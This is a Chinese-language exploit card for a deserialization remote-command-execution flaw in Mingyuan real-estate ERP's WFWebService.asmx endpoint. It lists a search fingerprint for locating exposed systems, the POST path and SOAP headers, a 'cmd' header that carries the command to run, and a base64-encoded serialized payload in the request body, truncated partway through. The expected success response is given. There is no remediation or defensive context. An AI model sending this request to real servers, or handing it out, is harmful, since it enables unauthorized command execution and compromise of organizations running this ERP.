# 明源地产ERPWFWebService.asmx反序列化RCE漏洞

- **系统**：明源地产ERPWFWebService.asmx　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="明源地产ERP"`
- **请求**：`POST /MyWorkflowManagement/WebService/WFWebService.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`SOAPAction: "http://tempuri.org/WriteLog"`　`cmd: dir`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<WriteLog xmlns="http://tempuri.org/">
<request>H4sIAGW+k2UA/+1ZXWwcV/W/M17vxzje2HGaNunXpklTpwnbdWznozRNHdtJtnFiJ+skLWm0md29tqeZndnOzLp2Higv9E/hpQiEEAKJJ1QkJCpUQYVoVQkJCf0pgkp9pOpDVfGA6BMCUdH097szs147zlcV89cfenfn7Nxzv84599xzzj0rNCHEFRT+sqzTAU6WFv1A1vNjZmDuzp2Vnm+5zsE9+QI/u3OjTTtoevKgI5uBZ9q7c1PNim1Vj8vFafeSdA5W9u0zh6vDewcODA7Jwv4DnZy8r21OBUoyMIDfFL3nT8u6G1jO7BHXq5tBX4yOfk+addk…（脚本共 4565 字，完整版见原文）
```
- **预期**：200　|　—